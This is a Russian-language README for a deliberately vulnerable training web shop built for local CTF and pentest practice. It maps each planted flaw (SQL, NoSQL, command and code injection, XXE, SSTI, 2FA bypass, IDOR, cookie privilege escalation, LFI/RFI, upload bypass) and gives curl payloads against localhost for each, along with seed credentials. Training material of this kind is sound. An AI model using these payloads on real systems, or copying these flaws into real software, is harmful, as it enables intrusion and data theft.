# VulnShop (Training Lab)

> Учебное **намеренно уязвимое** веб-приложение интернет-магазина для молодых пентестеров.

## Важно
- Это приложение создано только для безопасной локальной лаборатории CTF/обучения.
- Не разворачивайте в интернете.

## Запуск
```bash
docker compose up --build
```
Сервис будет на `http://localhost:8000`.
Swagger UI доступен на `http://localhost:8000/swagger`.

Если видите ошибку подключения к MySQL с `caching_sha2_password`, убедитесь, что образ `web` пересобран с актуальным `requirements.txt` (в проект добавлен пакет `cryptography`).

## Архитектура
- `web` — Flask приложение.
- `mysql` — основная SQL БД.
- `mongo` — коллекции отзывов для NoSQL сценариев.
- Добавлен более реалистичный UI магазина: каталог с фильтрами, карточки товара, корзина, checkout и личный кабинет.

## Карта уязвимостей (без подсказок в интерфейсе)

### SQL Injection
- `GET /products/search?q=...&category=...` — единственная SQLi-точка в приложении (classic/error/union/boolean/time через разные payload'ы).

### NoSQL Injection
- `GET|POST /product/<pid>/reviews/moderation` (фильтр модерации отзывов с JSON-like значениями)

### Command Injection
- `GET|POST /shipping/carrier/diagnostics` (параметр `host`)

### Code Injection
- `GET|POST /admin/pricing/rules/preview` (параметр `expr`)

### Host Header Injection
- `GET /admin.php` для admin-пользователя: доступ к панели завязан на `X-Forwarded-Host` (ожидается `176.105.200.130`, можно подменить заголовок)

### XML Injection / XXE
- `GET|POST /admin/catalog/import/xml` (payload в поле `xml_payload`)

### SSTI
- `GET|POST /admin/marketing/email/preview` (поле `tpl`)

### Auth/Session уязвимости
- Enumeration users: разные ответы в `/auth/login`, `/auth/register` (duplicate) и `/auth/forgot`
- Brute-force password / forgot / 2FA: слабые ограничения для обычных пользователей
- OTP код для 2FA теперь динамический: меняется каждые 10 минут (4 цифры)
- Login rate limiting: после 25000 попыток на один username вход блокируется на 5 минут; после успешного входа счётчик для этого username сбрасывается
- OTP rate limiting: после 5 попыток ввода OTP аккаунт блокируется на 60 секунд
- 2FA bypass (намеренная уязвимость): при наличии `pre_2fa_user` можно открыть `/account/dashboard` и получить полноценную сессию без проверки OTP
- Default credentials: `alice/dancercHick2000`
- Vulnerable password reset: токен предсказуем
- HTTP Verb tampering: `PUT /auth/login`
- IDOR: `GET /orders/<id>`
- Privilege escalation: роль берётся из cookie `role` (base64), можно поднять права подменой `dXNlcg==` (`user`) -> `YWRtaW4=` (`admin`)

### Где есть защита (намеренно не всё уязвимо)
- Для `admin` входа остался дополнительный фактор `admin_otp`, но ограничений частоты входа нет.

### File handling
- File upload bypasses: `POST /files/upload` (client-side checks, weak black/white/type filters)
- LFI / Path traversal: `GET /pages?page=...`
- RFI: `GET /remote/include?url=...`

## Примеры payload'ов к атакам

> Все примеры использовать **только локально** в учебной среде.

### SQL Injection

**`/products/search?q=...&category=...`:**
```bash
curl "http://localhost:8000/products/search?q=' OR 1=1 -- -&category=%"
curl "http://localhost:8000/products/search?q=' UNION SELECT 1,2,3,4,'x' -- -&category=%"
curl "http://localhost:8000/products/search?q=test&category=electronics' OR '1'='1"
curl "http://localhost:8000/products/search?q=' OR IF(1=1,SLEEP(3),0) -- -&category=%"
```

### NoSQL Injection (`/product/<pid>/reviews/moderation`)
Сценарий: фильтр модерации принимает JSON-like значения в `author`, `rating`, `text`, `card_number`. Для демонстрации можно использовать Mongo-операторы `$where`, `$ne`, `$in`, `$regex`.

1) Войти как админ (или подменить cookie `role=YWRtaW4=`).
2) Открыть `/product/1/reviews/moderation`.
3) Передавать JSON в поля фильтра (GET query или POST form).

Примеры эксплуатации:
```bash
# $ne: получить все отзывы, где автор не alice
curl "http://localhost:8000/product/1/reviews/moderation?author={\"$ne\":\"alice\"}&status=all" \
  -b "role=YWRtaW4="

# $in: выбрать отзывы с рейтингом 4 или 5
curl "http://localhost:8000/product/1/reviews/moderation?rating={\"$in\":[4,5]}&status=all" \
  -b "role=YWRtaW4="

# $regex: поиск по тексту отзыва
curl "http://localhost:8000/product/1/reviews/moderation?text={\"$regex\":\".*great.*\",\"$options\":\"i\"}&status=all" \
  -b "role=YWRtaW4="

# $where: top-level JavaScript выражение в запросе отзывов
curl "http://localhost:8000/product/1/reviews/moderation?author={\"$where\":\"this.rating>=4\"}&status=all" \
  -b "role=YWRtaW4="
```

Аналогично для `payment_cards`: строковый поиск работает только по **полному номеру карты** в формате `####-####-####-####` (частичные строки типа `1` не матчатся).
```bash
# точное совпадение по номеру карты
curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'card_number=4111-1111-1111-1111' \
  --data-urlencode 'status=all' \
  -b "role=YWRtaW4="

# operator-based вариант (если нужен для демонстрации NoSQLi)
curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'card_number={"$regex":"^4111"}' \
  --data-urlencode 'status=all' \
  -b "role=YWRtaW4="
```

### Command Injection (`/shipping/carrier/diagnostics`)
```bash
curl -X POST "http://localhost:8000/shipping/carrier/diagnostics" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "host=127.0.0.1;id"
```

### Code Injection (`/admin/pricing/rules/preview`)
```bash
curl -X POST "http://localhost:8000/admin/pricing/rules/preview" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'expr=__import__("os").popen("id").read()' \
  -b "role=YWRtaW4="
```

### Host Header Injection (`/admin.php`)
```bash
curl "http://localhost:8000/admin.php" \
  -H "X-Forwarded-Host: 176.105.200.130" \
  -b "role=YWRtaW4="

curl "http://localhost:8000/admin.php" \
  -H "X-Forwarded-For: 176.105.200.130" \
  -b "role=YWRtaW4="
```

### XML Injection / XXE (`/admin/catalog/import/xml`)
```bash
curl -X POST "http://localhost:8000/admin/catalog/import/xml" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'xml_payload=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><products><item><name>&xxe;</name></item></products>' \
  -b "role=YWRtaW4="
```

### SSTI (`/admin/marketing/email/preview`)
```bash
curl -X POST "http://localhost:8000/admin/marketing/email/preview" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'user=test' \
  --data-urlencode 'tpl={{7*7}}' \
  -b "role=YWRtaW4="
```

### Auth/Session

**HTTP Verb tampering (`PUT /auth/login`):**
```bash
curl -X PUT "http://localhost:8000/auth/login?username=alice"
```

**IDOR (`/orders/<id>`):**
```bash
curl "http://localhost:8000/orders/1"
curl "http://localhost:8000/orders/2"
```

**Privilege escalation via cookie role:**
```bash
# user -> admin
# dXNlcg== -> YWRtaW4=
curl "http://localhost:8000/admin.php" -b "role=YWRtaW4="
```

### File handling

**Upload bypass (`/files/upload`):**
```bash
curl -X POST "http://localhost:8000/files/upload" \
  -F "file=@shell.php5;type=image/png"
```

**LFI / traversal (`/pages`):**
```bash
curl "http://localhost:8000/pages?page=../../../../etc/passwd"
```

**RFI (`/remote/include`):**
```bash
curl "http://localhost:8000/remote/include?url=https://example.org"
```

## Реалистичный функционал магазина
- Каталог, карточка товара, корзина, checkout.
- Личный кабинет, редактирование профиля, адресная книга.
- Wishlist и центр поддержки (тикеты).
- Эндпоинты магазина: бренды (`/shop/brands`), подборки скидок (`/shop/deals`), диагностика доставки (`/shipping/carrier/diagnostics`), модерация отзывов (`/product/<pid>/reviews/moderation`), маркетинговый и каталог-импортные админ-процессы.
- Часть маршрутов реализована безопаснее, часть — намеренно уязвима для учебы.

## Seed users
- `admin / Riv3rN0rth!29`
- `alice / dancercHick2000`
- `bob / KestrelMoon84#`
- `mira / Zx!9vQ2#Lm7@tP5$Hs1`
- `niko / Qw#4Rp!8Tz@1Yv$6Nd2`
